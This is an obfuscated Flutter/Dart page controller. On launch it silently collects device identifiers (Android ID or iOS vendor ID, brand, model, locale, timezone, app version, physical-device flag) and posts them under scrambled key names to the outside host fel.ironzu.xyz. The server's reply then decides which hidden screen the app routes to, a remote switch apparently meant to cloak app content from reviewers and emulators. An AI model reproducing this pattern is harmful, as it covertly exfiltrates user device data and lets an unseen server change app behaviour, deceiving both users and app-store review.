import 'dart:convert';
import 'dart:io';

import 'package:device_info_plus/device_info_plus.dart';
import 'package:dio/dio.dart';
import 'package:flutter_inappwebview/flutter_inappwebview.dart';
import 'package:flutter_timezone/flutter_timezone.dart';
import 'package:get/get.dart';
import 'package:package_info_plus/package_info_plus.dart';

class PageLogic extends GetxController {

  var gimjxbz = RxBool(false);
  var tmocfxznb = RxBool(true);
  var yhvt = RxString("");
  var aracely = RxBool(false);
  var prohaska = RxBool(true);
  final kvbnjosuhd = Dio();


  InAppWebViewController? webViewController;

  @override
  void onInit() {
    super.onInit();
    pdtxwesa();
  }


  Future<void> pdtxwesa() async {

    aracely.value = true;
    prohaska.value = true;
    tmocfxznb.value = false;

    kvbnjosuhd.post("https://fel.ironzu.xyz/9898SH",data: await oqvsig()).then((value) {
      var iestr = value.data["iestr"] as String;
      var dowl = value.data["dowl"] as bool;
      if (dowl) {
        yhvt.value = iestr;
        viviane();
      } else {
        roob();
      }
    }).catchError((e) {
      tmocfxznb.value = true;
      prohaska.value = true;
      aracely.value = false;
    });
  }

  Future<Map<String, dynamic>> oqvsig() async {
    final DeviceInfoPlugin twhpmrga = DeviceInfoPlugin();
    PackageInfo bfrwcztl_gxrnqozf = await PackageInfo.fromPlatform();
    final String currentTimeZone = await FlutterTimezone.getLocalTimezone();
    var kbaonqh = Platform.localeName;
    var ZyTsnHo = currentTimeZone;

    var whPGX = bfrwcztl_gxrnqozf.packageName;
    var mgwUCb = bfrwcztl_gxrnqozf.version;
    var covitSRa = bfrwcztl_gxrnqozf.buildNumber;

    var Govgh = bfrwcztl_gxrnqozf.appName;
    var trevorCartwright = "";
    var parisRobel = "";
    var XsZK  = "";
    var uikdhKnS = "";
    var iTwcKx = "";
    var tressaGreen = "";


    var LnBUvGf = "";
    var UHDBF = false;

    if (GetPlatform.isAndroid) {
      LnBUvGf = "android";
      var dujrpesc = await twhpmrga.androidInfo;

      uikdhKnS = dujrpesc.brand;

      iTwcKx  = dujrpesc.model;
      XsZK = dujrpesc.id;

      UHDBF = dujrpesc.isPhysicalDevice;
    }

    if (GetPlatform.isIOS) {
      LnBUvGf = "ios";
      var gupsztye = await twhpmrga.iosInfo;
      uikdhKnS = gupsztye.name;
      iTwcKx = gupsztye.model;

      XsZK = gupsztye.identifierForVendor ?? "";
      UHDBF  = gupsztye.isPhysicalDevice;
    }

    var res = {
      "Govgh": Govgh,
      "covitSRa": covitSRa,
      "whPGX": whPGX,
      "iTwcKx": iTwcKx,
      "trevorCartwright" : trevorCartwright,
      "ZyTsnHo": ZyTsnHo,
      "uikdhKnS": uikdhKnS,
      "parisRobel" : parisRobel,
      "kbaonqh": kbaonqh,
      "mgwUCb": mgwUCb,
      "LnBUvGf": LnBUvGf,
      "UHDBF": UHDBF,
      "tressaGreen" : tressaGreen,
      "XsZK": XsZK,

    };
    return res;
  }

  Future<void> roob() async {
    Get.offAllNamed("/colorTab");
  }

  Future<void> viviane() async {
    Get.offAllNamed("/colorLong");
  }

}
